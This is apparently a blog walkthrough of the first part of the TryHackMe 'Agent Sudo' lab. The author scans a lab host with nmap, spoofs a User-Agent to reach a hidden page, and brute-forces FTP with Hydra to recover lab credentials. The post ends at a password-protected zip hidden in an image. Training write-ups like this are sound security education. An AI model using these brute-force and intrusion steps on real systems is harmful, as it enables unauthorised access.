---
title: Agent Sudo | TryHackMe WriteUp
date: 2024-06-15
categories: [Walkthrough]
tags: [TryHackMe]
---

![image](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/d2c9057e-ec75-4e46-93c2-9e88350f1c96)

**Lab URL:** [Agent Sudo](https://tryhackme.com/r/room/agentsudoctf)

## Scenario

You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.

**Target IP Address:** 10.10.61.20

## Initial Nmap Scan

Run the initial Nmap scan to identify open ports and services:

```bash
nmap -A 10.10.61.20 > nmap
```

The results of the Nmap scan:

```plaintext
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 10:47 IST
Nmap scan report for 10.10.61.20
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/30%OT=21%CT=1%CU=30825%PV=Y%DS=5%DC=T%G=Y%TM=6658
OS:0C2B%P=x86_64-unknown-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=I%TS=A)
OS:SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508S
OS:T11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=
OS:68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=
OS:M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)
OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G
OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 5 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   104.26 ms 10.17.0.1
2   ... 4
5   254.98 ms 10.10.61.20

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.71 seconds
```

## Analysis

Open ports and running services:

- **21/tcp**: FTP (vsftpd 3.0.3)
- **22/tcp**: SSH (OpenSSH 7.6p1 Ubuntu 4ubuntu0.3)
- **80/tcp**: HTTP (Apache httpd 2.4.29)

## Next Steps

A web server is running on port 80. Let’s open it and investigate further.

`Access the web server on port 80 (http://10.10.61.20)`

![Screenshot from 2024-05-30 10-52-30](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/cbe38abb-008a-439b-9f99-0cfb6392e441)

Upon visiting the webpage, it displays an announcement indicating to check the `/agent_C_attention.php` page using a specific User-Agent. The instructions hint that the User-Agent should be the codename "C".

To intercept the request and change the User-Agent, I used Burp Suite's Intruder.

![Screenshot from 2024-05-30 10-53-19](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/a311ddb0-f341-4d6d-b17d-f2a269f2dd7a)

Here's how the modified HTTP request looks like:

```
GET /agent_C_attention.php HTTP/1.1
Host: 10.10.61.20
User-Agent: C
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

When I accessed the `/agent_C_attention.php` page with the appropriate User-Agent, it revealed a hidden message.

![Screenshot from 2024-05-30 10-53-24](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/7c0c8451-afee-48a3-86a0-827261a8469b)

This message provides a username, Chris, and hints that it has a weak password. To find the password, we can use a brute-force attack on the FTP service with Hydra.

## Brute Forcing FTP with Hydra

Using Hydra, we can attempt to brute-force the password for the `chris` user:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.61.20
```

The successful attempt shows:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-30 10:54:56
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.61.20:21/
[STATUS] 148.00 tries/min, 148 tries in 00:01h, 14344251 to do in 1615:21h, 16 active
[21][ftp] host: 10.10.61.20   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-30 10:56:

51
```

- **username**: chris
- **password**: crystal

## FTP Access

Now that we have the credentials, we can log in through FTP:

```bash
ftp 10.10.61.20
```

Using the obtained credentials:

```
Connected to 10.10.61.20.
220 (vsFTPd 3.0.3)
Name (10.10.61.20:nijith): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||16534|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> mget *
```

We download the files to our local machine:

```
mget To_agentJ.txt
mget cute-alien.jpg
mget cutie.png
```

## Analyzing Files

The content of `To_agentJ.txt`:

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

This hints that the password is hidden in one of the images. We will use steganography tools to extract hidden information.

## Steganography Analysis

First, we use `steghide` to check for hidden information in the images. We also use `exiftool` to check for any embedded metadata, but nothing significant was found.

### Using Binwalk

We try `binwalk` to look for hidden files within `cutie.png`:

```bash
binwalk -e cutie.png
```

Binwalk reveals a hidden zip file inside `cutie.png`, but it is encrypted. We attempt to extract it:

```bash
7z x cutie.png
```

However, this prompts for a password. We need to further investigate to find the correct password to extract the hidden contents successfully.

---

**To Be Continued...**

Stay tuned for the next part where we will crack the password for the hidden zip file and continue our journey to uncover the secrets of the deep sea server.

---
